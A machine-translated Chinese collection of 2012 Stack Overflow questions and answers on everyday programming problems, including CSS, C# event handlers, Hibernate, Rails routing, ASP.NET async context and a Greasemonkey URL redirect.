> 时间：2012-09-30T08:26:30.480

您可以在[PDFjet](http://pdfjet.com/os/edition.html)尝试在 Android 中处理 PDF 文件，并可以查看此处给出的一些[示例](http://pdfjet.com/java/by-example.html)。

# websocket - 本地主机上的 Websocket (WAMP 2) 并在任何免费的网络主机上运行 websocket

> ID：12659806
> 
> 赞同：0
> 
> 时间：2012-09-30T08:24:51.983
> 
> 标签：websocket

有人可以详细解释（连同目录结构）如何在本地主机上使用 websockets 吗？是否有任何免费的虚拟主机站点可以让您立即使用 Websockets？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T21:29:13.530

不知道您的问题的上下文，但这就是您可以很好地设置 websocket 通信的方法：[http](http://martinsikora.com/nodejs-and-websocket-simple-chat-tutorial) ://martinsikora.com/nodejs-and-websocket-simple-chat-tutorial 。

# javascript - 孩子上方的css box-shadow，但保持交互

> ID：12659809
> 
> 赞同：0
> 
> 时间：2012-09-30T08:25:15.113
> 
> 标签：javascript, html, javascript-events, css

我已经阅读了几个主题，例如

*   [在文本上方显示框阴影](https://stackoverflow.com/questions/8657685/display-box-shadow-above-the-text)
*   [儿童顶部的CSS3盒子阴影](https://stackoverflow.com/questions/2402473/css3-box-shadow-on-top-of-children)

和许多其他人，但我找不到我搜索的答案。当一个元素被放置在其他元素之上时，与这些元素的交互被破坏（没有事件通过）。这意味着，无法选择基础文本或不会触发元素事件。[这是关于jsFiddle](http://jsfiddle.net/4W24K/)的演示。

如您所见，有两个问题。

1.  如前所述，无法选择文本，也无法将悬停事件传播到`div.hover`元素。
2.  元素的大小`div.shadow`不是绝对正确的。这就是为什么`div.hover`元素的一部分在阴影框之外（在那里，悬停事件到达悬停元素）。

对于第一个问题，我很欣赏纯 CSS 的解决方案，但我也会对一些 JavaScript 感到满意。

谢谢，

* * *

*附录*：问题 2\. 在 Mozilla Firefox 15.0.1 上

![在此处输入图像描述](../Images/193181d9957505fbc8f578c4e8ddd951.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:33:45.543

1.  您可以使用 CSS[`pointer-events`](https://developer.mozilla.org/en-US/docs/CSS/pointer-events)属性。`div.shadow`根据这个[jsFiddle](http://jsfiddle.net/4W24K/1/)设置它。
2.  我看不出问题出在哪里（使用 Chrome 23）。

**更新**

对于 #2 删除固定高度`div.wrapper`并添加`overflow: auto`（这将允许边距对`div.hovered`有一些影响`div.wrapper`）。看到这个[jsFiddle](http://jsfiddle.net/4W24K/2/)。

# c# - c# + NUnit 中的数据驱动测试框架

> ID：12659810
> 
> 赞同：1
> 
> 时间：2012-09-30T08:25:15.247
> 
> 标签：c#, c#-4.0, automated-tests, selenium-webdriver

我需要在我的工作地点用 C# 创建一个数据驱动的测试框架。我有时间去掌握 c#，因为我的经验主要是在 java 方面。基本上，该框架将适用于：

*   Selenium 网络驱动程序
*   NUnit 测试框架
*   C＃

我已经能够成功创建测试并通过 NUnit GUI 运行它们。没关系。丢失的一点是如何从外部文件（数据库表或 excel）中提取测试参数。最好是数据库表。

例如，我想在此表中存储 xpaths、urls、测试数据等参数，然后在我的测试中引用它们。这样，我不必在测试中编辑代码或硬代码参数。我只是从数据库中提取。

任何帮助将不胜感激。谢谢。

# javascript - 使用 javascript 关闭多个弹出窗口

> ID：12659812
> 
> 赞同：0
> 
> 时间：2012-09-30T08:25:24.630
> 
> 标签：javascript, asp.net

弹出窗口用于允许用户在单独的窗口中打开文档页面。当用户试图打开下一个文档页面时，必须关闭所有以前的文档页面窗口。

所以基本上，我想关闭多个弹出窗口。为了保存打开的弹出窗口的引用，我将包含弹出窗口引用的数组保存在一个变量中，并且该变量的值保存在一个隐藏字段中。

现在，`popup = window.open('', '', sOptions);`返回`[object]`，当它`[object]`被检索到时，它会生成一个错误，即对象不支持这个属性或方法。

我在使用 asp/vb.net 开发的 Web 应用程序中使用以下 javascript：

```
 var popupWin = new Array();

    function OnPopupClick(url,title,name) {
        var popup = null;
        var sOptions;
        sOptions = 'status=yes,menubar=no,scrollbars=yes,resizable=yes,toolbar=no,titlebar=yes,location=0,directories=0';
        sOptions = sOptions + ',width=' + (screen.availWidth - screen.availWidth / 2).toString();
        sOptions = sOptions + ',height=' + (screen.availHeight - 50).toString();
        sOptions = sOptions + ',screenX=0,screenY=0'
        sOptions = sOptions + ',left=' + ((screen.availWidth / 2) - 10).toString();
        sOptions = sOptions + ',top=0';
        html = '<html><head><title>'+ title + '</title></head><body style="margin: 0px 0; text-align:center; "><IMG src="' + url + '" BORDER=0 NAME=image height="' + (screen.availHeight - 50).toString() +'" width="' + ((screen.availWidth - screen.availWidth / 2)-20).toString() +'" onload="window.resizeTo((document.image.width-(document.image.width-(screen.availWidth - screen.availWidth / 2)))+10,((document.image.height*1.3)-(screen.availHeight - 50))+((screen.availHeight - 50)*3)";></body></html>';
        popup = window.open('', '', sOptions);
        popup.document.open();
        popup.document.write(html);
        popup.document.focus();
        popup.document.close();

        if(document.getElementById('<%= hidTitle.ClientID %>').value!=name){
            ClosePopupWin(document.getElementById('<%= hidWinRef.ClientID %>').value);
        }
        TrackPopupWinOpen(popup,name); 
   }

    function TrackPopupWinOpen(winName,title) {
        popupWin[popupWin.length] = winName;
        var index = popupWin.length-1;
        var val = popupWin.join();

        document.getElementById('<%= hidWinRef.ClientID %>').value=val;
        document.getElementById('<%= hidTitle.ClientID %>').value=title;
    }

    function ClosePopupWin(retVal) {
        popupWin[popupWin.length]=retVal.split();
        var openCount = popupWin.length;
        for (i = 0; i < openCount; i++) {
            popupWin[i].close();
        }
    } 
```

我究竟做错了什么？

我不能使用任何第三方工具。我只能使用asp中可用的控件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T09:02:56.830

我建议使用不同的方法。弹出窗口会带来超出您所描述的各种问题，主要是广告拦截软件。即便如此，还有一种更有效的方法可以做到这一点。使用扩展或浮动 div 来管理这些。根据您发布的 Javascript，没有异步检索任何数据，因此不需要弹出窗口。如果您只是使用函数或 .NET 控件在页面底部的 div 中呈现图像，则可以使用 CSS 和更轻量级的 Javascript 使用绝对（或固定）定位来打开和关闭这些图像。

# node.js - Azure 网站 node.js http 请求失败

> ID：12659817
> 
> 赞同：2
> 
> 时间：2012-09-30T08:26:10.903
> 
> 标签：node.js, azure

我正在尝试使用 node.js 和 git 部署的 Azure 网站的免费层。它非常巧妙，但我试图在我的一个处理程序中对 Facebook 进行 Web 服务调用，但它失败并出现 500 内部服务器错误和以下堆栈跟踪：

```
Application has thrown an uncaught exception and is terminated:
Error: connect EADDRNOTAVAIL
at errnoException (net.js:670:11)
at connect (net.js:548:19)
at Socket.connect (net.js:613:5)
at Object.<anonymous> (net.js:77:12)
at new ClientRequest (http.js:1091:25)
at Object.request (http.js:1427:10)
at Object.get (http.js:1432:21) 
```

该代码在本地运行时运行良好。这是 Azure 网站的限制，还是有其他方法可以做到这一点？我的代码如下所示（我使用的是 express）：

```
app.get('/login', function (req, res) {
  var tokenUrl = 'http://foo.com';
  var body = '';
  http.get(tokenUrl, function (tokenRes) {
    tokenRes.on('data', function (chunk) {
      body += chunk;
    }).on('end', function () {
      res.end(body);
    });
  }).on('error', function (err) {
    console.log('Error fetching site: ' + err.message);
  });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-23T07:36:14.047

是的，我也遇到了这个问题。@Steven lckman 的回答对我不起作用。

* * *

嘿，@Alec Siu，我已经解决了这个问题。Azure 建议使用请求模块来发出 http 请求。见[这里](http://msdn.microsoft.com/en-us/library/windowsazure/jj631641.aspx)。但没有给出理由。无论如何，它运作良好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-14T15:15:01.453

所以我遇到了同样的问题，但调用了 https.get()。从 https.get() 切换到 https.request() 为我解决了这个问题。鉴于 http.get() 在本地对我来说工作得很好，这似乎有点疯狂。我很害怕知道这里发生了什么:(

# javascript - Greasemonkey 将站点 URL 从 .html 重定向到 -print.html？

> ID：12659824
> 
> 赞同：1
> 
> 时间：2012-09-30T08:26:52.930
> 
> 标签：javascript, redirect, greasemonkey

需要帮助为 Greasemonkey 编写脚本，以帮助我更有效地阅读论坛。

重定向所有以 结尾的页面`.html`：

```
http://www.site.com/thread-category/4525-url.html 
```

到这个可打印版本的 URL：

```
http://www.site.com/thread-category/4525-url-print.html 
```

（添加`-print`，就在结束之前`.html`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T09:01:42.993

为此，请考虑可能的 URL 参数和哈希标签：

```
// ==UserScript==
// @name     _Redirect site.com to print.html URL's
// @include  /site\.com\/thread.+?\.html\b/
// @grant    none   
// @run-at   document-start
// ==/UserScript==

if ( ! /print\.html$/i.test (location.pathname) ) {
    var printPath   = location.pathname.replace (/(\.html)$/, "-print$1");
    var newURL      = location.protocol + "//"
                    + location.host
                    + printPath
                    + location.search
                    + location.hash
                    ;
    location.replace (newURL);
} 
```

请注意，我们使用`@include`.

# python - Python 3.3 HTTP Cookie 错误

> ID：12659833
> 
> 赞同：1
> 
> 时间：2012-09-30T08:28:19.383
> 
> 标签：python, http, python-requests, python-3.3

我刚刚完成了 Python 3.3 的全新安装（从源代码），并安装了“请求”库。我正在尝试一个非常简单的请求：

```
r = requests.get('https://www.google.com/') 
```

我得到一个非常奇怪的错误作为回报：

```
File "/usr/local/lib/python3.3/http/cookiejar.py", line 1647, in extract_cookies
  if self._policy.set_ok(cookie, request):
File "/usr/local/lib/python3.3/http/cookiejar.py", line 931, in set_ok
  if not fn(cookie, request):
File "/usr/local/lib/python3.3/http/cookiejar.py", line 952, in set_ok_verifiability
  if request.unverifiable and is_third_party(request):
AttributeError: 'MockRequest' object has no attribute 'unverifiable' 
```

看到我仍然是一个 Python 初学者，我完全不知道是什么导致了这个错误。有任何想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-30T08:50:23.617

这适用于 python 3.2：

```
Python 3.2.3 (default, Apr 13 2012, 13:31:19) 
[GCC 4.2.1 Compatible Apple Clang 3.0 (tags/Apple/clang-211.12)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import requests
>>> r = requests.get('https://www.google.com/') 
```

[`requests`常见问题解答](https://requests.readthedocs.io/en/latest/community/faq/#python-3-support)说明了官方支持的python 3 版本，而您刚刚发现 python 3.3`requests`还没有（还）工作。

问题跟踪器中有一个[可用的补丁](https://github.com/kennethreitz/requests/pull/871)，所以这只是时间问题。

**更新**：[版本 0.14.1](http://pypi.python.org/pypi/requests/0.14.1)于 2012/10/01 发布，修复：

> ### 0.14.1 (2012-10-01)
> 
> *   Python 3.3 兼容性
> *   简单的默认接受编码
> *   Bug修复

# qt - “gdb 进程崩溃”

> ID：12659834
> 
> 赞同：2
> 
> 时间：2012-09-30T08:28:28.630
> 
> 标签：qt, gdb

当我在 Qt Creator 中运行这个最小程序时，我收到错误“gdb 进程崩溃”：

```
int main(int argc, char *argv[]) {
    return 0;
} 
```

这是`gdb`日志：

```
ADAPTER SUCCESSFULLY STARTED
NOTE: ENGINE SETUP OK
State changed from EngineSetupRequested(1) to EngineSetupOk(3).
QUEUE: SETUP INFERIOR
State changed from EngineSetupOk(3) to InferiorSetupRequested(4).
QUEUE: SETUP INFERIOR
HANDLE GDB ERROR: The gdb process was ended forcefully
GDB PROCESS FINISHED, status 1, code -1073741701
NOTE: ENGINE ILL ******
State changed from InferiorSetupRequested(4) to EngineShutdownRequested(20).
QUEUE: SHUTDOWN ENGINE
CALL: SETUP INFERIOR
Setting up inferior...
CALL: SHUTDOWN ENGINE
PLAIN ADAPTER SHUTDOWN 20
INITIATE GDBENGINE SHUTDOWN IN STATE 4, PROC: 0
NOTE: ENGINE SHUTDOWN OK
State changed from EngineShutdownRequested(20) to EngineShutdownOk(22).
State changed from EngineShutdownOk(22) to DebuggerFinished(23).
QUEUE: FINISH DEBUGGER
NOTE: FINISH DEBUGGER
HANDLE RUNCONTROL FINISHED
Debugger finished. 
```

我在*i686-pc-mingw32*配置中使用 gdb 6.8。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-02T08:43:22.730

原来它是由 in 的不兼容版本引起`python27.dll`的`QtSDK\pythongdb\python_2.7based`。我已经更换了它，因为 Secunia PSI 一直在唠叨我这个 DLL 已经过时且不安全。我恢复到旧的 DLL，它现在工作正常。

# hibernate - 列表查询中的休眠条件

> ID：12659840
> 
> 赞同：1
> 
> 时间：2012-09-30T08:29:10.243
> 
> 标签：hibernate, list, criteria

我有2节课。头等舱汽车有一个乘客名单。我需要一个休眠标准来返回我有一个乘客的汽车。所以像这样

```
class Car {

   @Id
   private Long id;
   @OneToMany
   private List<Passenger> passengers;
} 
```

在 Hibernate 类中

```
@Override
public Car retrieve(Passenger passenger) {
    Criteria criteria = super.createCriteria();
    criteria.add(Restrictions.eq("passengers", passenger));
    return (Car  ) criteria.uniqueResult();
} 
```

但是，以下内容不会真正起作用。所以任何建议如何做到这一点

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:54:19.063

您需要在此处将 Car 表与 Passenger 表连接起来，这可以使用标准 API 的别名来完成。您应该尝试以下操作：

```
@Override
public Car retrieve(Passenger passenger) {
    Criteria criteria = super.createCriteria();
    criteria.createAlias("passengers", "p");
    criteria.add(Restrictions.eq("p.id", passenger.getId()));
    return (Car) criteria.uniqueResult();
} 
```

另一个提示：我认为乘客只能在汽车中出现一次，所以我更喜欢`Set<Passenger>`而不是`List<Passenger>`.

# c# - 您如何确定是否在 c# 中单击了任何按钮？

> ID：12659844
> 
> 赞同：0
> 
> 时间：2012-09-30T08:29:55.500
> 
> 标签：c#, winforms

我正在尝试制作井字游戏程序，并想知道如何确定是否单击了任何按钮以及它是哪个按钮。我目前正在重复每个按钮内的代码：

```
private void button1_Click(object sender, EventArgs e)
{
  button1.Visible = false;
  label1.Text = "X";
  Application.DoEvents();

}
private void button2_Click(object sender, EventArgs e)
{
  button2.Visible = false;
  label2.Text = "X";
  Application.DoEvents();
}

private void button3_Click(object sender, EventArgs e)
{
   button3.Visible = false;
   label3.Text = "X"
   Application.DoEvents();
} 
```

有没有更优雅的方法来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T08:40:29.747

有两种方法可以完成您所追求的（假设 WinForms）..

首先，您可以连接所有按钮以指向同一个事件处理程序.. 并检查其名称：

```
// In the form designer code:
this.buttonNW.Click += new System.EventHandler(this.button_Click);
this.buttonN.Click += new System.EventHandler(this.button_Click);
this.buttonNE.Click += new System.EventHandler(this.button_Click);

// in the form code:
private void button_Click(object sender, EventArgs e) {
    Button thisButton = (Button)sender;

    switch (thisButton.Name) {
        case "buttonNW":
            MessageBox.Show("North West button clicked");
            break;
        case "buttonN":
            MessageBox.Show("Northern button clicked");
            break;
        case "buttonNE":
            MessageBox.Show("North East button clicked");
            break;
    }
} 
```

其次，您可以将逻辑放入它自己的函数中，并为每个单独的事件处理程序调用该函数：

```
private void buttonNW_Click(object sender, EventArgs e) {
    handleButtonClick("buttonNW");
}

private void buttonN_Click(object sender, EventArgs e) {
    handleButtonClick("buttonN");
}

private void buttonNE_Click(object sender, EventArgs e) {
    handleButtonClick("buttonNE");
}

private void handleButtonClick(string buttonName) {
    switch (buttonName) {
        case "buttonNW":
            MessageBox.Show("North West button clicked");
            break;
        case "buttonN":
            MessageBox.Show("Northern button clicked");
            break;
        case "buttonNE":
            MessageBox.Show("North East button clicked");
            break;
    }
} 
```

我个人会选择选项 2，以便一切都清楚。

不过，考虑到您在井字游戏中最多只能有 9 个按钮，这是一个微不足道的练习。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T08:54:52.020

处理这种情况的最“优雅”的方法之一是使用字典。这种方法不需要冗长的 switch 语句。

首先使用表单设计器将每个按钮的 Tag 属性设置为唯一的字符串值

```
button1.Tag = "B1"
button2.Tag = "B2"
button3.Tag = "B3"
button4.Tag = "B4"
.... 
```

并将按钮单击事件处理程序设置为相同的方法

```
button1.Click = "button_click"
button2.Click = "button_click"
button3.Click = "button_click"
button4.Click = "button_click"
.... 
```

在代码窗口中，在表单中全局声明一个字典

```
private Dictionary<string, Action> buttonActions; 
```

在 Form_Load 事件中初始化 Dictionary

```
buttonActions = new Dictionary<string, Action>();
buttonActions.Add("B1", button1Action);
buttonActions.Add("B2", button2Action);
buttonActions.Add("B3", button3Action);
buttonActions.Add("B4", button4Action);
..... 
```

现在在 button_click 事件处理程序中，您需要编写此代码

```
private void button_click(object sender, System.EventArgs e)  
{  
    var btnKey = ((Button)sender).Tag.ToString();  
    if(buttonActions.ContainsKey(btnKey))
        buttonActions[btnKey].Invoke();
} 
```

当然，您仍然需要为每个按钮操作编写特定代码，例如

```
private void button1Action()
{ ... }
private void button2Action()
{ ... }
private void button3Action()
{ ... }
private void button4Action()
{ ... } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T08:40:52.303

在 Asp.Net 中，您可以从`Page_Load`Winforms 中的等效项中执行此操作

```
button1.Click += new EventHandler(MyButtons_Click);
button2.Click += new EventHandler(MyButtons_Click);
button3.Click += new EventHandler(MyButtons_Click);

protected void MyButtons_Click(object sender, EventArgs e)
{
   Button clickedButton = (Button) sender;

   if(clickedButton.Text == "O")
     doThis();

   if(clickedButton.Text == "X")
      doThat();

} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-30T09:24:44.797

我宁愿用它`Linq to Object`来创建按钮和关联事件以及编写自定义逻辑，因为这个游戏的大部分属性都是相同的。

```
myFormConstructor()
{    
       //Panel or Container control or collection that is persistant can be used to hold buttons that will be created dynamically i.e. 9 buttons to this panel in our case
       for(int i = 1 ; i <= 9 ; i++)
       {
           var btn = new Button{
                                 Name = "btn"+i.ToString()
                                 Text = i.ToString()
                               });

           btn.Click += new System.EventHandler(listener_button_click);
           pnl.Controls.Add(btn);    
       }
}
///Write common logic for each button using if else
private void listener_button_click(object sender, EventArgs e) 
{

    var btnName = ((Button)sender).Name;
            switch (btnName)
            {
                case "btn1":
                    //handler for btn1 click
                    break;
                case "btn2":
                    //handler for btn2 click
                    break;
            }    
    } 
```

编辑：对于窗口应用程序，使用面板/组框将是最佳选择，因为`panel.Controls.OfType<Button>().ForEach(`您可以利用一个属性来检索面板中的所有按钮或任何容器控件，以最小化代码并编写干净的逻辑。此外，您不需要任何收藏

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-30T08:42:55.910

在您的通用单击处理程序方法中，您可以检查调用按钮的名称属性。

```
private void ButtonClick(object sender, System.EventArgs e)
{
        var btnName = ((Button)sender).Name;
        switch (btnName)
        {
            case "btn1":
                //handler for btn1 click
                break;
            case "btn2":
                //handler for btn2 click
                break;
        }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-30T08:54:35.397

在 C# 中，独立于您使用 ASP.NET、WPF、Areo 或 WinForm。您使用[Event](http://msdn.microsoft.com/en-us/library/awbftdfh.aspx)和[delegates](http://msdn.microsoft.com/en-us/library/ms173171%28v=vs.80%29.aspx)。要掌握这一点，您应该阅读[有关代表的教程](http://msdn.microsoft.com/en-us/library/aa288459%28v=vs.71%29.aspx)和[有关事件](http://msdn.microsoft.com/en-us/library/aa645739%28v=vs.71%29.aspx)的教程。

该示例将基于 C# 2.0 和 WinForm。

首先，您必须创建将处理该操作的方法：

```
private void hadnleActionForButton(Button button) {

   //Do some magic after button press

} 
```

当我们有一个可以发挥魔力的方法时，我们需要创建一个事件并委托使用它，或者我们可以只使用已经存在的事件和委托。

在您的情况下，您希望在单击按钮后执行该操作

所以首先我们创建适合委托的方法：

```
private void listener_button_click(object sender, EventArgs e) {

  if(sender is Button) {
    Button b = sender as Button;
    handleActionForButton(b);
  }

} 
```

最后一步是将事件分配给按钮，这是通过重载运算符 += 完成的

```
this.button1.Click += new System.EventHandler(listener_button_click); 
```

就是这样。

# extjs - 如何为 ExtJs 中的关联模型分配记录？

> ID：12659845
> 
> 赞同：3
> 
> 时间：2012-09-30T08:30:21.600
> 
> 标签：extjs

我有一个模型评论，其中“hasOne”模型UserDigest。出于某种原因，我想将 UserDigest 加载到其他位置，然后将其放入相应的评论中。做这样的事情：

```
comment.userDigest().setData(userDigest.getData()); 
```

但我找不到这样的方法。有人可以告诉我如何将现有记录设置为关联模型的数据吗？

或者如何将现有模型分配给关联模型？像这样的东西：

```
comment.userDigest = userDigest; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T17:51:37.927

当您设置关系时，应该有一个为评论自动创建的 comment.setUserDigest() 方法。

如果您为模型使用命名空间，则必须在关系中设置 setterName 属性，您可以在其中将其设置为 setUserDigest

不过，这只设置了外部值，您可能还想设置实例。您可能还必须更改关系的名称和实例名称。

请阅读这个：

[http://extjs-tutorials.blogspot.ca/2012/05/extjs-belongsto-association-rules.html](http://extjs-tutorials.blogspot.ca/2012/05/extjs-belongsto-association-rules.html)

# visual-studio-2010 - InstallShield Visual Studio 未安装服务

> ID：12659847
> 
> 赞同：6
> 
> 时间：2012-09-30T08:30:38.067
> 
> 标签：visual-studio-2010, installshield

我在 .NET 中有一个使用 C# 的服务项目。然后，我在 Visual Studio 中使用 InstallShield 2012 创建了一个应该安装我的服务的 MSI，但是当我运行 MSI 时，该服务永远不会显示在“服务”窗口中。

我通过创建组件、高级设置-> 创建新服务来创建服务。然后添加了我的 C# 项目的整个 /bin/debug （因为我不确定只有 .exe 就足够了）

但是，我不确定如何告诉 InstallShield 继续执行我的服务的实际安装。我不希望用户通过 InstallUtil 工具通过命令行手动执行此操作。

是否可以告诉 InstallShield 安装服务？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T16:38:52.577

您必须转到服务的主要输出的属性，然后是 COM & .NET 选项卡，并在“安装程序类”复选框中打勾。

[有关更多信息，请在此处](https://stackoverflow.com/questions/11994725/how-do-i-create-an-installshield-le-project-to-install-a-windows-service/13162618#13162618)查看我的答案

# ruby-on-rails - 没有主键的 Rails 表

> ID：12659850
> 
> 赞同：0
> 
> 时间：2012-09-30T08:31:01.537
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1, ruby-on-rails-3.2

我有一个关于 Rails 的问题。我的数据库中有一个没有主键的表，其中包含这些列 - person_id、year、salary。我的问题是当我想编辑其中一份薪水时。我不明白该怎么做。那是我的代码：

工资控制员：

```
def index
    @salaries = Salary.all
end

def edit
    @salary = Salary.find_by_person_id_and_year(params[:person_id], params[:year])
    @people = Person.all
end 
```

index.html.erb

```
<% @salaries.each do |salary| %>
    <b><%= salary.person.Name %></b>
    <b><%= salary.Year %></b>
    <b><%= salary.Amount %></b>
    <%= link_to "Edit", edit_salary_path(salary.person_id, salary.year)%>
<% end %> 
```

所以，我将它添加到我的 routes.rb 中：

```
get 'salaries/index', :to => 'salaries#index',:as => 'salaries'
get 'salaries/:person_id/:year', :to => 'salaries#show', :as => 'salary'   
get 'salaries/new/:person_id/:year', :to => 'salaries#edit', :as => 'new_salary'
get 'salaries/edit/:person_id/:year', :to => 'salaries#edit', :as => 'edit_salary'
put 'salaries/:person_id/:year', :to => 'salaries#update'
post 'salaries/:person_id/:year', :to => 'salaries#create'
delete 'salaries/:person_id/:year', :to => 'salaries#destroy' 
```

但是我的 _form.html.erb 中有这些错误消息：“undefined method `join' for nil:NilClass” on this line: <%= form_for(@salary) do |f| %>

```
def edit
    @person_id = params[:person_id]
    @year = params[:year]
    @salary = Salary.find_by_person_id_and_year(params[:person_id], params[:year])
    @people = People.all
end

def update
    @people = People.all
    @salary = Salary.new(params[:salary])
    if @salary.save
        flash[:success] = "Successfully edited salary"
        redirect_to salaries_path
    else
        @title = "Edit salary"
        render 'edit'
    end
end

_form.html.erb

<%= form_for(@salary, :url => salaries_path(:person_id => @person_id, :year => @year)) do |f|   %> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T09:09:02.493

Rails 路由会自动寻找 id，所以你需要自定义你的路由。

例如，不要`resources :salaries`在 config/routes.rb 中尝试类似：

```
get 'salaries/index', :to => 'salaries#index',:as => 'salaries'
get 'salaries/edit/:person_id/:year', :to => 'salaries#edit', :as => 'edit_salaries'
put 'salaries/:person_id/:year', :to => 'salaries#update' 
```

使用您需要的其他路线，例如：

```
get 'salaries/index', :to => 'salaries#index',:as => 'salaries'
get 'salaries/:person_id/:year', :to => 'salaries#show', :as => 'salary'
get 'salaries/new/:person_id/:year', :to => 'salaries#edit', :as => 'new_salary'
get 'salaries/edit/:person_id/:year', :to => 'salaries#edit', :as => 'edit_salary'
put 'salaries/:person_id/:year', :to => 'salaries#update'
post 'salaries/:person_id/:year', :to => 'salaries#create'
delete 'salaries/:person_id/:year', :to => 'salaries#destroy' 
```

和形式：

```
form_for(@salary, :url => salary_path(:person_id => X, :year => Y)) do |f| 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T08:44:49.043

如果您可以在薪金表中添加额外的 ID 列，则可以使用标准的 rails 函数，例如

```
(in app/models/person.rb)

class Person
  has_many :salaries
  has_one :current_salary, :class_name => "Salary", 
          :conditions => lambda { {:year => Time.now.year} }
  # outer curlies are for the lambda, inner curlies are for it to return a hash
end

(in config/routes.rb)

resources :people do
  resources :salaries
end 
```

然后通过ID使用普通访问

# asp.net - AspNetSynchronizationContext

> ID：12659851
> 
> 赞同：24
> 
> 时间：2012-09-30T08:31:03.410
> 
> 标签：asp.net, .net, asynchronous, async-await, c#-5.0

尝试使用新的 C# 5 异步模型令我惊讶的`AspNetSynchronizationContext`是一个内部类（以及`AspNetSynchronizationContextBase`基类）。因此无证。但是在您的 ASP.NET 代码中使用 async/await 功能时，了解它的作用很重要。我是否正确，它**确实**保证您的延续将与`HttpContext.Current`原始呼叫者相同？它**不**保证延续将在与调用者相同的线程上执行？

如果后一个假设不正确并且我得到了原始线程，我可以确保在延续中获得相同的线程上下文吗？我的意思是与线程和线程本地存储相关的主体/文化？这很重要，因为 ASP.NET 本地化依赖于线程的文化，而我的应用程序依赖于 .NET 角色安全模型（线程的主体）。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-09-30T12:28:05.983

> 我是否正确它确实保证您的延续将获得与原始调用者相同的 HttpContext.Current ？它不保证延续将在与调用者相同的线程上执行？

是的，`HttpContext.Current`被保留了，是的，延续可能在不同的线程上执行。

> 我的意思是与线程和线程本地存储相关的主体/文化？这很重要，因为 ASP.NET 本地化依赖于线程的文化，而我的应用程序依赖于 .NET 角色安全模型（线程的主体）。

普通线程本地存储丢失。您可以通过使用`LogicalCallContext`（与 一起流动`ExecutionContext`）来缓解这种情况，但`async`直接引用变量会更容易。

本金始终保留；否则会带来安全风险。这与`ExecutionContext`.

我相信文化会随着[.NET 4.5 的新实现](https://stackoverflow.com/questions/9562836/whats-the-meaning-of-usetaskfriendlysynchronizationcontext)`AspNetSynchronizationContext`而流动，但我还没有对此进行测试。

* * *

您可能会发现我的[MSDN 文章`SynchronizationContext`](http://msdn.microsoft.com/en-us/magazine/gg598924.aspx)很有帮助。它不是官方文档（我不为微软工作），但至少它是一些东西。请注意，该`AspNetSynchronizationContext`文章中引用的内容现在`LegacyAspNetSynchronizationContext`在 .NET 4.5 中调用。

另一个很好的资源是 Stephen Toub 的[`ExecutionContext`vs.`SynchronizationContext`](http://blogs.msdn.com/b/pfxteam/archive/2012/06/15/executioncontext-vs-synchronizationcontext.aspx) .

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-30T09:28:33.633

好吧，虽然总是保证捕获 ExecutionContext，但在同一个 SynchronizationContext 上捕获和运行执行取决于 Awaiter。

最常见的等待器（当您“等待”某物时在内部调用的 GetAwaiter() 方法返回的类型）是由 Task.GetAwaiter() 返回的 TaskAwaiter。默认情况下，TaskAwaiter**将捕获当前 SynchronizationContext 并在捕获的 SynchronizationContext 上运行延续委托**。这意味着，您将能够在方法的其余部分中使用 HttpContext.Current，并且您不介意它将作为延续运行。因此，此代码将按预期工作（您编写“B”的部分将在与第一行相同的同步上下文中运行）：

```
HttpContext.Current.Response.Write("A");
await Task.Delay(1000);
HttpContext.Current.Response.Write("B") 
```

您可以通过使用更改此行为`Task.ConfigureAwait(false)`方法告诉等待者不要将方法的其余部分编组回原始 SynchronizationContext。

当然，如果您在调用的异步方法中使用 Task.Run 或 Task.Factory.StartNew，那么您有责任再次捕获 SynchronizationContext。

祝你好运。

# ruby-on-rails-3 - rails 3.2 找不到文件'jquery.ui.core'

> ID：12659858
> 
> 赞同：1
> 
> 时间：2012-09-30T08:32:19.020
> 
> 标签：ruby-on-rails-3

在 heroku 生产中使用 DataTables gem 时出现以下错误。

```
couldn't find file 'jquery.ui.core'
couldn't find file 'jquery.ui.theme' 
```

我按照[http://railscasts.com/episodes/340-datatables?view=asciicast](http://railscasts.com/episodes/340-datatables?view=asciicast)给出的方法 有人知道吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-02T17:44:06.557

我在服务器运行时更​​改了 Gemfile。重启服务器解决了这个问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-30T12:25:28.500

*jquery-datatables-rails* gem 不安装 jQuery UI gem。至少他们的 .gemspec 是这么说的。因此，您需要在您的`Gemfile`

```
gem 'jquery-ui-rails' 
```

[Github](https://github.com/joliss/jquery-ui-rails) page infact 建议添加资产组

```
group :assets do
  gem 'jquery-ui-rails'
end 
```

如果您不使用捆绑器，则只需使用以下命令安装 gem：

```
gem install jquery-ui-rails 
```

# java - 在 Wicket 6.0 中更改区域设置后如何刷新有状态页面？

> ID：12659859
> 
> 赞同：1
> 
> 时间：2012-09-30T08:32:21.957
> 
> 标签：java, internationalization, wicket

我当前的项目允许用户更改所有页面在每个页面上显示的语言（通过单击一排标志图标中的一个）。这是链接的实现：

```
